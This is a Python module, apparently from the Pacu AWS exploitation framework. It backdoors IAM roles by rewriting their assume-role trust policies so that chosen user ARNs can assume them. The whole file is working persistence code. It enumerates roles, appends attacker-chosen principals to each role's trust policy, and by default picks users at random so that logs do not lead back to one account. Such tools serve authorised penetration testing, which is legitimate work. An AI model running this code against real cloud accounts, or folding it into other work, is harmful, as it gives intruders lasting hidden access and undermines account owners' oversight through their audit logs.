#!/usr/bin/env python3
import argparse
import json
from random import choice

from botocore.exceptions import ClientError


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'iam__backdoor_assume_role',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_all_roles.py',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'PERSIST',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Creates assume-role trust relationships between users and roles.',

    # Description about what the module does and how it works
    'description': 'This module creates a trust relationship between one or more user accounts and one or more roles in the account, allowing those users to assume those roles.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['IAM'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--role-names', '--user-arns', '--no-random'],
}


parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--role-names', required=False, default=None, help='A comma-separated list of role names from the AWS account that trust relationships should be created with. Defaults to all roles.')
parser.add_argument('--user-arns', required=False, default=None, help='A comma-separated list of user ARNs that the trust relationship with roles should be created with. By default, user ARNs in this list are chosen at random for each role to try and prevent the tracking of the logs all back to one user account. Without this argument, the module will default to the current user.')
parser.add_argument('--no-random', required=False, action='store_true', help='If this argument is supplied in addition to a list of user ARNs, a trust relationship is created for each user in the list with each role, rather than one of them at random.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    key_info = pacu_main.key_info
    fetch_data = pacu_main.fetch_data
    get_aws_key_by_alias = pacu_main.get_aws_key_by_alias
    ######

    client = pacu_main.get_boto3_client('iam')

    rolenames = []
    user_arns = []
    summary_data = {}

    if args.role_names is None:
        print('Fetching Roles... ')
        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles') is False:
            print('Sub-module Execution Failed')
            print('  Exiting...')
            return
        for role in session.IAM['Roles']:
            rolenames.append(role['RoleName'])
        print('{} Role(s) Found'.format(len(session.IAM['Roles'])))
    else:
        rolenames = args.role_names.split(',')

    if args.user_arns is None:
        # Find out the current users ARN
        # This should be moved into the creds array in the "Arn" parameter for those set of keys that are running this module
        user = key_info()
        active_aws_key = get_aws_key_by_alias(session.key_alias)

        if 'Arn' not in user or user['Arn'] is None:
            sts_client = pacu_main.get_boto3_client('sts')
            user_info = sts_client.get_caller_identity()
            active_aws_key.update(pacu_main.database, arn=user_info['Arn'], user_id=user_info['UserId'], account_id=user_info['Account'])

        user_arns.append(active_aws_key.arn)
    else:
        if ',' in args.user_arns:
            user_arns.extend(args.user_arns.split(','))
        else:
            user_arns.append(args.user_arns)  # Only one ARN was passed in

    iam = pacu_main.get_boto3_resource('iam')
    backdoored_role_count = 0
    print('Backdoor the following roles?')
    for rolename in rolenames:
        target_role = 'n'
        if args.role_names is None:
            target_role = input('  {}  (Y/N) '.format(rolename))

        if target_role.lower() == 'y' or args.role_names is not None:
            print('    Backdooring {}...'.format(rolename))
            try:
                role = iam.Role(rolename)
                original_policy = role.assume_role_policy_document
                hacked_policy = modify_assume_role_policy(original_policy, user_arns, args.no_random)
                client.update_assume_role_policy(
                    RoleName=rolename,
                    PolicyDocument=json.dumps(hacked_policy)
                )
                print('    Backdoor successful!')
                backdoored_role_count += 1
            except ClientError as error:
                print('      FAILURE:')
                code = error.response['Error']['Code']
                if code == 'UnmodifiableEntity':
                    print('        SERVICE PROTECTED BY AWS')
                elif code == 'AccessDenied':
                    print('        MISSING NEEDED PERMISSIONS')
                else:
                    print('        {}'.format(code))
    summary_data['RoleCount'] = backdoored_role_count
    return summary_data


def summary(data, pacu_main):
    out = ''
    if 'RoleCount' in data:
        out += '  {} Role(s) successfully backdoored\n'.format(data['RoleCount'])
    return out


def modify_assume_role_policy(original_policy, user_arns, no_random):
    if 'Statement' in original_policy:
        statements = original_policy['Statement']

        for statement in statements:
            if 'Effect' in statement and statement['Effect'] == 'Allow':
                if 'Principal' in statement and isinstance(statement['Principal'], dict):
                    # Principals can be services, federated users, etc.
                    # 'AWS' signals a specific account based resource
                    # print(statement['Principal'])
                    if 'AWS' in statement['Principal']:
                        if isinstance(statement['Principal']['AWS'], list):
                            # If there are multiple principals, append to the list
                            if no_random:
                                for arn in user_arns:
                                    statement['Principal']['AWS'].append(arn)

                            else:
                                arn = choice(user_arns)
                                statement['Principal']['AWS'].append(arn)

                        else:
                            # If a single principal exists, make it into a list
                            statement['Principal']['AWS'] = [statement['Principal']['AWS']]
                            if no_random:
                                for arn in user_arns:
                                    statement['Principal']['AWS'].append(arn)

                            else:
                                arn = choice(user_arns)
                                statement['Principal']['AWS'].append(arn)

                    else:
                        # No account based principal principal exists
                        if no_random and len(user_arns) > 1:
                            statement['Principal']['AWS'] = []
                            for arn in user_arns:
                                statement['Principal']['AWS'].append(arn)

                        else:
                            arn = choice(user_arns)
                            statement['Principal']['AWS'] = arn

                elif 'Principal' not in statement:
                    # This shouldn't be possible, but alas, it is
                    if no_random and len(user_arns) > 1:
                            statement['Principal'] = {'AWS': []}
                            for arn in user_arns:
                                statement['Principal']['AWS'].append(arn)

                    else:
                        arn = choice(user_arns)
                        statement['Principal'] = {'AWS': arn}

    return original_policy  # now modified in line
